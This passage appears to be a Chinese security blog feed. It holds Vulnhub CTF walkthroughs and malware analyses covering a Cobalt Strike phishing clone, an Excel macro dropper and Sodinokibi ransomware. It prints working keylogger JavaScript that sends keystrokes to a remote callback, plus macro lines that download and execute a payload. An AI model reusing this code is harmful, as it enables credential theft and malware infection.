      <content type="html"><![CDATA[<p>靶场链接:<a href="http://www.vulnhub.com/entry/harrypotter-aragog-102,688/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-aragog-102,688/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap<br><img src="https://z3.ax1x.com/2021/06/16/2XcHoQ.png" alt=""></p><p>gobuster web扫描<br><img src="https://z3.ax1x.com/2021/06/16/2XcOWn.png" alt=""></p><p>访问/blog发现是个wordpress<br><img src="https://z3.ax1x.com/2021/06/16/2XgR7F.png" alt=""></p><p>需要添加hosts  (这里我已经添加了)<br><img src="https://z3.ax1x.com/2021/06/16/2X2FHS.png" alt=""></p><p>wpscan扫描wordpress<br>（存在wp-admin用户）<br><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>插件扫描,存在wp-file-manager插件，版本6.0</p><pre><code>wpscan --url http://aragog.hogwarts/blog -t 20 --plugins-detection aggressive</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2X2e9s.png" alt=""></p><p>这个版本存在任意文件上传，利用该洞getshell即可<br><img src="https://z3.ax1x.com/2021/06/16/2XRCG9.png" alt=""></p><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/16/2XRix1.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到flag，并得知/home目录下查找ginny和hagrid98用户<br><img src="https://z3.ax1x.com/2021/06/16/2XRtIg.png" alt=""></p><p>原本以为/var/www/html下是存放wordpress的路径，查看后发现不是。最后在/usr/share/wordpress发现数据库配置文件</p><pre><code>find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot;find / -maxdepth 5 -type f -writable 2&gt; /dev/null | grep -v &quot;/proc&quot; | grep &quot;config&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XR4Q1.png" alt=""></p><p>查询数据库得到wp-admin用户的密码</p><pre><code>use wordpress;select * from wp_users;</code></pre><p><img src="https://z3.ax1x.com/2021/06/16/2XRjSA.png" alt=""></p><p>cmd5查询得到密码<br><img src="https://z3.ax1x.com/2021/06/16/2XWpef.png" alt=""></p><p>ssh撞密码得<br><img src="https://z3.ax1x.com/2021/06/16/2XWVln.png" alt=""></p><p>后续常规linux提权检测发现没有有用的东西，上pspy检测root权限的进程，最后发现有个定时任务执行/opt/.backup.sh<br><img src="https://z3.ax1x.com/2021/06/16/2XWBfH.png" alt=""></p><p>里面插入反弹shell等待即可获得root shell<br><img src="https://z3.ax1x.com/2021/06/16/2XW6Xt.png" alt=""></p><h2 id="wp-file-任意文件上传分析"><a href="#wp-file-任意文件上传分析" class="headerlink" title="wp-file 任意文件上传分析"></a>wp-file 任意文件上传分析</h2><p>漏洞点位于file manager的connector.minimal.php文件，具体路径在wordpress\wp-content\plugins\wp-file-manager\lib\php\connector.minimal.php<br><img src="https://z3.ax1x.com/2021/06/16/2XW7Xq.png" alt=""></p><p>首先实例化一个elFinderConnector对象，然后调用它的run()方法，跟进run()<br>跟进到FILES数据判断<br><img src="https://z3.ax1x.com/2021/06/16/2XfpcR.png" alt=""></p><p>最后调用exec函数进入到文件上传处理点<br><img src="https://z3.ax1x.com/2021/06/16/2XfAAO.png" alt=""></p><p>Upload函数（关键点是Content-Type类型存在image即进入文件保存）<br><img src="https://z3.ax1x.com/2021/06/16/2Xf8US.png" alt=""></p><p>详细分析链接:<a href="https://www.anquanke.com/post/id/216990" target="_blank" rel="noopener">https://www.anquanke.com/post/id/216990</a></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vulnhub HarryPotter:Nagini</title>
      <link href="/posts/a52d611e.html"/>
      <url>/posts/a52d611e.html</url>
      <content type="html"><![CDATA[<p>vulnhub链接：<a href="http://www.vulnhub.com/entry/harrypotter-nagini,689/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/harrypotter-nagini,689/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap</p><pre><code>nmap -sV -A 192.168.93.225</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HE0Gd.png" alt=""></p><p>gobuster扫web</p><pre><code>gobuster dir -e -u http://192.168.93.225 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,rar,7z</code></pre><p><img src="https://z3.ax1x.com/2021/06/14/2HAxDf.png" alt=""></p><p>有个joomla CMS，进入后台就能通过模板getshell，除此之外还有个note.txt。访问如下<br><img src="https://z3.ax1x.com/2021/06/15/2HEXi4.png" alt=""></p><blockquote><p>提示用http3访问quic.nagini.hogwarts，将域添加进/etc/hosts</p></blockquote><p>得到提示的路径<br><img src="http://www.vxer.cn/zb_users/upload/2021/05/202105071620395007860213.png" alt="vxer.cn的图"></p><p>访问internalResourceFeTcher.php，存在SSRF漏洞<br>读取internalResourceFeTcher.php源码</p><pre><code>file:///var/www/html/internalResourceFeTcher.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVidO.png" alt=""> </p><p>读取/etc/passwd<br><img src="https://z3.ax1x.com/2021/06/15/2HVVWd.png" alt=""></p><p>读取joomla CMS数据库配置文件</p><pre><code>file:///var/www/html/joomla/configuration.php</code></pre><p><img src="https://z3.ax1x.com/2021/06/15/2HVuOP.png" alt=""></p><p>可以发现mysql没使用密码进行登录，意味着可以用ssrf访问mysql<br>》MySQL客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证；当无需密码认证时直接发送TCP/IP数据包即可。所以在非交互模式下登录并操作MySQL只能在无需密码认证，未授权情况下进行</p><h2 id="突破口"><a href="#突破口" class="headerlink" title="突破口"></a>突破口</h2><p>利用gopherus.py生成gopher payload<br><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener">https://github.com/tarunkant/Gopherus</a></p><p><img src="https://z3.ax1x.com/2021/06/15/2HV2Ox.png" alt=""></p><blockquote><p>注意:然后我们必须使用浏览器的 url 访问该站点。（curl 在这里不起作用。）如果没有显示内容，只需刷新页面几次。<br><img src="https://z3.ax1x.com/2021/06/15/2HVWm6.png" alt=""></p></blockquote><p>数据库版本<br><img src="https://z3.ax1x.com/2021/06/15/2HVwwT.png" alt=""></p><p>查看joomla数据库所有表<br><img src="https://z3.ax1x.com/2021/06/15/2HZkn0.png" alt=""></p><p>读取joomla_users<br><img src="https://z3.ax1x.com/2021/06/15/2HZABV.png" alt=""></p><p>查看后发现hash无法破解，直接将md5替换掉site_admin的用户然后在登录即可<br><img src="https://z3.ax1x.com/2021/06/15/2HZeNF.png" alt=""></p><p>登录后台<br>joomla/administrator<br><img src="https://z3.ax1x.com/2021/06/15/2HZu9J.png" alt=""></p><p>找到模板处写shell<br>(尝试phpinfo)<br><img src="https://z3.ax1x.com/2021/06/15/2HZK39.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HZQj1.png" alt=""></p><p>php_reverse_shell<br><img src="https://z3.ax1x.com/2021/06/15/2HZwjI.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>home目录下有两个用户snape,hermoine<br><img src="https://z3.ax1x.com/2021/06/15/2HZDDP.png" alt=""></p><p>在/home/snape目录下找到hermoine用户的ssh密码<br><img src="https://z3.ax1x.com/2021/06/15/2HuYqI.png" alt=""></p><p>登录后利用发现的SUID cp文件，将ssh公钥拷贝到/home/hermoine/.ssh/authorized_keys<br><img src="https://z3.ax1x.com/2021/06/15/2HuNZt.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuUdP.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuaIf.png" alt=""></p><p>实现私钥登录hermoine用户<br><img src="https://z3.ax1x.com/2021/06/15/2Huwi8.png" alt=""></p><p>用户目录下存在firefox的数据，scp下载到本地解密得到root密码<br><a href="https://github.com/unode/firefox_decrypt/releases/tag/0.7.0" target="_blank" rel="noopener">https://github.com/unode/firefox_decrypt/releases/tag/0.7.0</a><br><img src="https://z3.ax1x.com/2021/06/15/2Hu0JS.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/15/2HuBRg.png" alt=""></p><p>得到最后的flag<br><img src="https://z3.ax1x.com/2021/06/15/2HuDzQ.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="http://www.vxer.cn/?id=80" target="_blank" rel="noopener">http://www.vxer.cn/?id=80</a></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>hacksudo fgo</title>
      <link href="/posts/2f666841.html"/>
      <url>/posts/2f666841.html</url>
      <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RY6O0.png" alt=""></p><p>开放了80、21、3306、22</p><p>路径扫描<br><img src="https://z3.ax1x.com/2021/06/10/2RYRTU.png" alt=""></p><p>访问dict.txt得到一份字典，ftp爆破。得到正确密码<br><img src="https://z3.ax1x.com/2021/06/10/2RYXkD.png" alt=""></p><p>ftp登录上去，发现两个目录。东西全部下载下来<br><img src="https://z3.ax1x.com/2021/06/10/2RtAAS.png" alt=""></p><p>其中压缩包里wav后缀结尾的文件是凯撒加密，解密得到后台密码<br><img src="https://z3.ax1x.com/2021/06/10/2Rtm1s.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtUj1.png" alt=""></p><p>文件上传copy改名得到shell</p><p><img src="https://z3.ax1x.com/2021/06/10/2Rt69H.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RtDAO.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>得到shell<br><img src="https://z3.ax1x.com/2021/06/10/2RtggA.png" alt=""></p><p>发现SUID<br><img src="https://z3.ax1x.com/2021/06/10/2Rt5E8.png" alt=""></p><p>利用look读取/etc/shadow<br><img src="https://z3.ax1x.com/2021/06/10/2RtzUU.png" alt=""></p><p>john破解hash<br><img src="https://z3.ax1x.com/2021/06/10/2RNC8J.png" alt=""></p><p>登录得到user.txt，发现该用户目录下存在二进制文件fog<br><img src="https://z3.ax1x.com/2021/06/10/2RNEb6.png" alt=""></p><p>经过IDA分析，发现是setuid(0)/setguid(0)后调用python，而属主是root。可利用其提权<br><img src="https://z3.ax1x.com/2021/06/10/2RNrq0.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/10/2RNtIS.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>cs钓鱼克隆网站分析</title>
      <link href="/posts/9efc32ef.html"/>
      <url>/posts/9efc32ef.html</url>
      <content type="html"><![CDATA[<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>cs克隆<br><img src="https://z3.ax1x.com/2021/06/10/2RieSA.png" alt=""></p><p>克隆后的html和原html对比<br><img src="https://z3.ax1x.com/2021/06/10/2RilTS.png" alt=""></p><p>特征：</p><ol><li>IFRAME标签为大写，且长宽为0。</li><li>script标签加载了js路径为”/jquery/jquery.min.js”</li></ol><p>顺序特征:</p><ol><li>IFRAME标签和script标签同时出现时，一定是IFRAME标签、script标签和body标签这个顺序。</li><li>IFRAME标签和script标签只出现一个时，一定在body标签之前。</li></ol><p>引用的js分析：</p><pre><code class="javascript">var cfqPdaQzXzSSf = 0;window.onload = function loadfqPdaQzXzSSf() { //页面加载处理事件    lfqPdaQzXzSSf = &quot;,&quot;;    if (window.addEventListener)  { //对象触发指定的事件        document.addEventListener(&#39;keypress&#39;, pfqPdaQzXzSSf, true); //keypress所有键都会触发该事件，无论它们是否产生字符值 处理函数:pfqPdaQzXzSSf        document.addEventListener(&#39;keydown&#39;, dfqPdaQzXzSSf, true); //keydown当按下某个键时会触发该事件 处理函数:dfqPdaQzXzSSf    } else if (window.attachEvent)  { //attachEvent在IE9以下的版本中受到支持。其它的都支持addEventListener        document.attachEvent(&#39;onkeypress&#39;, pfqPdaQzXzSSf);        document.attachEvent(&#39;onkeydown&#39;, dfqPdaQzXzSSf);    } else { //两者都不支持全部置空        document.onkeypress = pfqPdaQzXzSSf;        document.onkeydown = dfqPdaQzXzSSf;    }}function pfqPdaQzXzSSf(e) {    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which; //只有当DOM事件处理程序被调用的时    kfqPdaQzXzSSf = kfqPdaQzXzSSf.toString(16); //将键盘码转换为ascii    if (kfqPdaQzXzSSf != &quot;d&quot;)  { //随便写个判断进入函数        fqPdaQzXzSSf(kfqPdaQzXzSSf);    }}function dfqPdaQzXzSSf(e) {    kfqPdaQzXzSSf = (window.event)?window.event.keyCode:e.which;    if (kfqPdaQzXzSSf == 9||kfqPdaQzXzSSf == 8||kfqPdaQzXzSSf == 13)  { //tab键，退格键，回车键        fqPdaQzXzSSf(kfqPdaQzXzSSf);    }}function fqPdaQzXzSSf(kfqPdaQzXzSSf) {    lfqPdaQzXzSSf = lfqPdaQzXzSSf + kfqPdaQzXzSSf + &quot;,&quot;; //键盘值拼接    var tfqPdaQzXzSSf = &quot;ZUyQXfawhPbi&quot; + cfqPdaQzXzSSf;    cfqPdaQzXzSSf++;    var ffqPdaQzXzSSf;    if (document.all&amp;&amp;(navigator.appVersion.match(/MSIE ([\d.]+)/)[1]) &lt;= 8.0)  { //浏览器版本判断是否小于或等于8.0        ffqPdaQzXzSSf = document.createElement(String.fromCharCode(60) + &quot;script name=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39; id=&#39;&quot;+tfqPdaQzXzSSf+&quot;&#39;&quot; + String.fromCharCode(62) + String.fromCharCode(60) + &quot;/script&quot; + String.fromCharCode(62));    } else {        ffqPdaQzXzSSf = document.createElement(&quot;script&quot;);        ffqPdaQzXzSSf.setAttribute(&quot;id&quot;, tfqPdaQzXzSSf);        ffqPdaQzXzSSf.setAttribute(&quot;name&quot;, tfqPdaQzXzSSf);    }    var ejDBFWFHhff = &#39;?id=&#39; + window.location.href.split(/\?id=/)[1]; //取键盘ascii码    ffqPdaQzXzSSf.setAttribute(&quot;src&quot;, &quot;http://10.23.66.18:8080/callback&quot; + ejDBFWFHhff + &quot;&amp;data=&quot; + lfqPdaQzXzSSf);    ffqPdaQzXzSSf.style.visibility = &quot;hidden&quot;;    document.body.appendChild(ffqPdaQzXzSSf); //实例化js，发送键盘码    if (kfqPdaQzXzSSf == 13||lfqPdaQzXzSSf.length &gt; 3000)  { //判断键盘码为回车键置空lfqPdaQzXzSSf变量        lfqPdaQzXzSSf = &quot;,&quot;;    }    setTimeout(&#39;document.body.removeChild(document.getElementById(&quot;&#39; + tfqPdaQzXzSSf + &#39;&quot;))&#39;, 5000); //延时5秒删除创建的js}</code></pre><p>页面加载处理事件,添加针对键盘按下的事件。触发事件的时候进入dfqPdaQzXzSSf和dfqPdaQzXzSSf函数处理，最后调用fqPdaQzXzSSf函数，将键盘码通过创建script标签将数据传送到远端。最后延迟5秒后删除创建的js</p><p>pfqPdaQzXzSSf函数：<br>键盘码转ascii码发送到fqPdaQzXzSSf函数</p><p>dfqPdaQzXzSSf函数：<br>如果按下tab键，退格键，回车键调用fqPdaQzXzSSf函数发送键盘</p><p><strong>chrome动态调试</strong><br><img src="https://z3.ax1x.com/2021/06/10/2RiDkF.png" alt="键盘码判断"></p><p><img src="https://z3.ax1x.com/2021/06/10/2RirY4.png" alt="键盘码拼接"></p><p><img src="https://z3.ax1x.com/2021/06/10/2Ri7pd.png" alt="js创建发送键盘码到远端"></p><p>cs远端接收的密码<br><img src="https://z3.ax1x.com/2021/06/10/2RiqXt.png" alt=""></p><p>360空间绘测特征搜索：</p><pre><code>response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;jquery/jquery.min.js\&quot;&gt;&lt;/script&gt; &lt;/body&gt;&quot;response:&quot;&lt;head&gt; &lt;base href=&quot; AND response:&quot;&lt;link rel=\&quot;shortcut icon\&quot; type=\&quot;image/x-icon\&quot; href=\&quot;/favicon.ico\&quot;&gt;&quot; AND response:&quot;WIDTH=\&quot;0\&quot; HEIGHT=\&quot;0\&quot;&gt;&lt;/IFRAME&gt;&quot;</code></pre><p><img src="https://z3.ax1x.com/2021/06/10/2RF9pj.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/1lZlqxTuEcS3VK1Ve8XDbA</a></p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>仿造Brown-Forman恶意文档分析</title>
      <link href="/posts/5245e2ed.html"/>
      <url>/posts/5245e2ed.html</url>
      <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>信息来源：<a href="https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m" target="_blank" rel="noopener">https://nitter.domain.glass/Arkbird_SOLG/status/1400845444889120783#m</a><br><img src="https://z3.ax1x.com/2021/06/09/2so9S0.png" alt=""></p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>VT查杀：<a href="https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection" target="_blank" rel="noopener">https://www.virustotal.com/gui/file/b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7fe/detection</a></p><pre><code>MD5    4fb331e4e5c6094e731690371687b110SHA-1    bcecaaba6462550c61f7ed572e2c06ef8f3f378aSHA-256    b8226e0691779280f1cbbcba93d41e01bc26a7ad37c88bc3b835e72c1376a7feVhash    ec726ed39dd1773fb0790767871cde5cSSDEEP    12288:HMc+2YnB6YTbkvA00E+XvQNBzcytqew5W99QPR69Ke+SajzvEnj/igo7tbhzdSNN:H8sYvkhRzdoW9yRCh+vwnj/it7vBSjTLSH    T148F423A542CEFD48EA3A3D3761C5039DA197ACEB93150F420E73DB22D99A6F32511F18</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2so30e.png" alt=""></p><p>执行流程<br><img src="https://z3.ax1x.com/2021/06/09/2so8TH.png" alt=""></p><p>下载下来，打开是典型的隐藏表执行宏<br><img src="https://z3.ax1x.com/2021/06/09/2soJkd.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2soYtA.png" alt=""></p><p>逐个提取出里面的vba，得到的结果是这样的<br><img src="https://z3.ax1x.com/2021/06/09/2sod6f.png" alt=""></p><pre><code>Auto_Open=AB16() ;=FORMULA.ARRAY(&#39;reierj ntrutruiret eruireur&#39;!AJ17&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ18&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ19&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ20&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ21&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ22&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ23&amp;&#39;reierj ntrutruiret eruireur&#39;!AJ24,AB17)=Z16() ;Z16=CALL(AB17,AC17,&quot;JCJ&quot;,AD16,0) //Kernel32,,JCJ,C:/Users/Public,0=CALL(&quot;UR&quot;&amp;&#39;reierj ntrutruiret eruireur&#39;!AM18,&#39;reierj ntrutruiret eruireur&#39;!AN17&amp;&#39;reierj ntrutruiret eruireur&#39;!AN18&amp;&#39;reierj ntrutruiret eruireur&#39;!AN19&amp;&#39;reierj ntrutruiret eruireur&#39;!AN20&amp;&#39;reierj ntrutruiret eruireur&#39;!AN21&amp;&#39;reierj ntrutruiret eruireur&#39;!AN22&amp;&#39;reierj ntrutruiret eruireur&#39;!AN23&amp;&#39;reierj ntrutruiret eruireur&#39;!AN24&amp;&#39;reierj ntrutruiret eruireur&#39;!AN25&amp;&#39;reierj ntrutruiret eruireur&#39;!AN26&amp;&#39;reierj ntrutruiret eruireur&#39;!AN27&amp;&#39;reierj ntrutruiret eruireur&#39;!AN28&amp;&#39;reierj ntrutruiret eruireur&#39;!AN29&amp;&#39;reierj ntrutruiret eruireur&#39;!AN30&amp;&#39;reierj ntrutruiret eruireur&#39;!AN31&amp;&#39;reierj ntrutruiret eruireur&#39;!AN32&amp;&#39;reierj ntrutruiret eruireur&#39;!AN33&amp;&#39;reierj ntrutruiret eruireur&#39;!AD17,AH24,0,A96,&#39;reierj ntrutruiret eruireur&#39;!AD16&amp;&#39;reierj ntrutruiret eruireur&#39;!AE16,0,0) //URLMon URLDownloadToFileA JJCCBB,0,https://opposedent.com/css/main.css  C:/Users/Public//send.css=AE25()  ;EXEC(&quot;wmic process call create &#39;C:/Users/Public/send.css&#39;&quot;)//远程下载https://opposedent.com/css/main.css 保存在C:/Users/Public/send.css，wmic创建进程执行C:/Users/Public/send.css</code></pre><p><strong> main.css </strong><br>MD5    6f891127db5efdb86a63c7a60a96103f<br>SHA-1    590945c764eb6acccadba94c02d0bc710886f865<br>SHA-256    944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b<br>Vhash    075066551d1d15155az5e!z<br>Authentihash    da7ab1728350ba9cf4a5f8dfa807d89002ad70db8c76829562500c0044776b37<br>Imphash    60f1da2d26406f6f3578f73785af8e9a<br>Rich PE header hash    004ccbc588d0cc025f006eb509f7f855<br>SSDEEP    12288:cGMMRFE7g6Ys/K7zyfuJTsQp4Cp6y5SrL1znr2LphlYuGUoPavYWIJdvrQoDpNkr:9zwRYs/K7ziuKU4jALFYuGDQ2vQoDkRN<br>TLSH    T10AF48D307A52C038F5FB21F85AA9DE34941DBAB0671C68CB63D55EE9D6385F89C3021B<br>PE查询结果<br><img src="https://z3.ax1x.com/2021/06/09/2soBnS.png" alt=""></p><p>VC写的，x86，开了ASLR<br><img src="https://z3.ax1x.com/2021/06/09/2soD0g.png" alt=""></p><p>整体流程是：</p><pre><code>1. 延时几秒2. 反调试检测3. 获取当前进程路径4. 读取自身，设置文件指针，文件数据读取5. 内存区域更改6. 加载执行</code></pre><p><img src="https://z3.ax1x.com/2021/06/09/2sor7Q.png" alt=""></p><p>反调试检测<br><img src="https://z3.ax1x.com/2021/06/09/2soykj.png" alt=""></p><p>加载对应的DLL和实例化对应的API<br><img src="https://z3.ax1x.com/2021/06/09/2so6ts.png" alt=""></p><p>读取自身<br><img src="https://z3.ax1x.com/2021/06/09/2sochn.png" alt=""></p><p>加载对应的DLL和API<br><img src="https://z3.ax1x.com/2021/06/09/2so2pq.png" alt=""></p><p>内存加载的PE<br><img src="https://z3.ax1x.com/2021/06/09/2soR10.png" alt=""></p><p>调试过一遍后，没看出什么危险的操作。利用沙箱运行得到以下结果<br><a href="https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013" target="_blank" rel="noopener">https://s.threatbook.cn/report/file/944e1871cecddd5c18a8939f246e5f552cb24f0b0179f4902c0559b2ad3d336b/?env=win7_sp1_enx86_office2013</a><br><img src="https://z3.ax1x.com/2021/06/09/2soWcV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/09/2sofXT.png" alt=""></p><h2 id="技术总结"><a href="#技术总结" class="headerlink" title="技术总结"></a>技术总结</h2><pre><code>1. Excel隐藏表执行宏2. 反调试，反沙箱3. 读取自身内存加载PE执行</code></pre><p>能力有限，勿喷</p>]]></content>
      
      
        <tags>
            
            <tag> 恶意分析 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HackSudo Aliens靶场</title>
      <link href="/posts/be372d38.html"/>
      <url>/posts/be372d38.html</url>
      <content type="html"><![CDATA[<p>vulnhub的一个靶场<br>链接：<a href="http://www.vulnhub.com/entry/hacksudo-aliens,676/" target="_blank" rel="noopener">http://www.vulnhub.com/entry/hacksudo-aliens,676/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>开局nmap<br><img src="https://z3.ax1x.com/2021/06/07/2dmTbj.png" alt=""></p><p>两个web，一个开了phpmyadmin<br>常规路径扫描<br><img src="https://z3.ax1x.com/2021/06/07/2dmban.png" alt=""></p><p>访问得到mysql.bak，拿到mysql连接凭证。phpmyadmin登录<br><img src="https://z3.ax1x.com/2021/06/07/2dmvxU.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnPaR.png" alt=""></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>查看secure_file_priv，可以写shell<br><img src="https://z3.ax1x.com/2021/06/07/2dnERK.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dneMD.png" alt=""></p><p>用php_reverse_shell.php反弹个shell<br><img src="https://z3.ax1x.com/2021/06/07/2dnMdA.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnKZd.png" alt=""></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>常规提权检测<br>1./etc/passwd是否可写<br>2.内核版本查询<br>3.suid和sudo查询<br>……<br>发现date有SUID权限，利用其读取/root/root.txt<br>拿到root.txt:)<br><img src="https://z3.ax1x.com/2021/06/07/2dnQII.png" alt=""></p><p>读取/root/.bash_history看到操作日志切换到hacksudo用户后给Downloads下的cpulimit设置了SUID<br><img src="https://z3.ax1x.com/2021/06/07/2dndds.png" alt=""></p><p>用date读取/etc/shadow<br><img src="https://z3.ax1x.com/2021/06/07/2dnwon.png" alt=""></p><p>拿到hacksudo hash，john爆破得到明文<br><img src="https://z3.ax1x.com/2021/06/07/2dnBiq.png" alt=""></p><p>登录后拿到users.txt<br>利用cpulimit执行/bin/bash，获得root<br><img src="https://z3.ax1x.com/2021/06/07/2dnDJ0.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnrWV.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/07/2dnszT.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场练习 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Sodinokibi勒索分析</title>
      <link href="/posts/d188378a.html"/>
      <url>/posts/d188378a.html</url>
      <content type="html"><![CDATA[<p><strong>ps:该文章并无完全分析出整个过程</strong><br>原样本分析链接：<a href="http://blog.nsfocus.net/revil-apt/" target="_blank" rel="noopener">http://blog.nsfocus.net/revil-apt/</a><br>样本下载地址：<a href="https://app.any.run/tasks/c6ea97fa-4ec4-4820-8280-5d1c8704b460/" target="_blank" rel="noopener">https://app.any.run/tasks/c6ea97fa-4ec4-4820-8280-5d1c8704b460/</a><br>该样本分析与参考链接分析过程不一样，那个链接应该是完全解密的。该勒索病毒<br>经过三断加密最后释放shellcode进行DLL加载调用</p><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>VT查杀结果<br><img src="https://z3.ax1x.com/2021/06/01/2ubDU0.png" alt=""></p><p>沙盒运行分析：<a href="https://app.any.run/tasks/9e9c51ad-cc20-4807-bace-41a9428b3681" target="_blank" rel="noopener">https://app.any.run/tasks/9e9c51ad-cc20-4807-bace-41a9428b3681</a></p><p>入口点分析:<br><img src="https://z3.ax1x.com/2021/06/01/2ub68U.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/01/2ubgv4.png" alt=""></p><p>释放MsMpEng.exe和Mpsvc.dll到TEMP目录</p><p>执行流程是：MsMpEng.exe加载Mpsvc.dll （白加黑）<br>调用的Mpsvc.dll的ServiceCrtMain函数<br><img src="https://z3.ax1x.com/2021/06/01/2ubRKJ.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/01/2ubfbR.png" alt=""></p><p>ServiceCrtMain函数<br><img src="https://z3.ax1x.com/2021/06/01/2ub5Ux.png" alt=""></p><p>sub_100011C0函数实现加载PE<br><img src="https://z3.ax1x.com/2021/06/01/2ubTPK.png" alt=""></p><p>跟踪VirtualProtect地址修改权限的地址，这里dump后是一段解密DLL加载的shellcode<br><img src="https://z3.ax1x.com/2021/06/01/2ub78O.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/06/01/2ubLKH.png" alt=""></p><p>Process Hacker dump运行一分钟后线程为RWX权限的内存保存，得到解密后的dll<br><img src="https://z3.ax1x.com/2021/06/01/2ubvVI.png" alt=""></p><p>修补PE头<br><img src="https://z3.ax1x.com/2021/06/01/2uqFMQ.png" alt=""></p><p>重构PE大小<br><img src="https://z3.ax1x.com/2021/06/01/2uqAqs.png" alt=""></p><p>最后调用dll实现勒索<br>第一段dump和运行时解密的dll加密度对比，左边是第一次dump的，右边是解密后的dll 还有加密（<br><img src="https://z3.ax1x.com/2021/06/01/2uqVZn.png" alt=""></p><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><p>IOCS:<br>835f242dde220cc76ee5544119562268<br>7d1807850275485397ce2bb218eff159<br>8cc83221870dd07144e63df594c391d9</p><h2 id="知识总结"><a href="#知识总结" class="headerlink" title="知识总结"></a>知识总结</h2><ul><li>遇见内存加载dll或反射dll加载，或者更改区断权限为RWX，对VirtualProtect函数地址下断点，断下后copy 